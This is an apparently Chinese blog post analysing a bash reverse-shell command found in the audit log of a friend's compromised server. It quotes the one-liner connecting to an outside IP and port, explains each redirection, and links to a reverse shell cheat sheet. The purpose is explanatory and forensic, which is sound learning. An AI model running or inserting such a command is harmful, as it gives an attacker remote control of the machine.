I"?<p>有朋友说一台服务器被黑客入侵了。安全没做好！！！  
查看 bash 审计日志，发现黑客执行的相关命令，其中有一条反弹 Shell 的命令，在被黑的服务器上执行如下：</p>

<blockquote>

  <p>bash -i &gt;&amp; /dev/tcp/173.208.201.162/9083 0&gt;&amp;1 &amp;</p>
</blockquote>

<p>执行后的效果就是黑客在自己的机器上利用 nc 等工具监听 9083 端口，不仅可以发送命令到被黑服务器上，命令的输出也会回显到黑客的机器上，<br />
整个表现就是被黑服务器的 Shell 反弹到黑客机器上了，和 SSH 远程登录一台服务器执行命令一样。</p>

<p>理解上面的单行命令，费了好半天，看来对 Bash Shell 的掌握还不够啊。</p>

<ul>
  <li>首先， bash -i 开启了 Shell 的交互模式，这样反弹 Shell 后，黑客可以和它交互；</li>
  <li>然后是这段： <code class="highlighter-rouge">&gt;&amp; /dev/tcp/173.208.201.162/9083</code>，表示 bash 打开到远程目标 IP 端口的 TCP 连接，并将标准出重定向到远程目标 IP 端口上；</li>
  <li>再然后是这段：0&gt;&amp;1，表示标准输入（这个标准输入是在远端执行的）也重定向到远程目标 IP 端口上？（PS: 这里我不是很好理解，如果高手看到请指点一下。）</li>
  <li>最后的 &amp; 表示后台运行，这样就相当于常驻后台的后门了。</li>
</ul>

<p>我不得不感叹，第一个想出这种用法的人真是变态啊，算是奇技淫巧，对 Bbash Shell 和 TCP 的掌握很深入了。</p>

<h1 id="ref">Ref</h1>
<p><a href="http://blog.csdn.net/trochiluses/article/details/13767669">交互式shell和非交互式shell</a>   
<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a><br />
<a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">REVERSE SHELL WITH BASH</a><br />
<a href="http://superuser.com/questions/335396/what-is-the-difference-between-and-in-bash">What is the difference between &amp;&gt; and &gt;&amp; in bash?</a></p>
:ET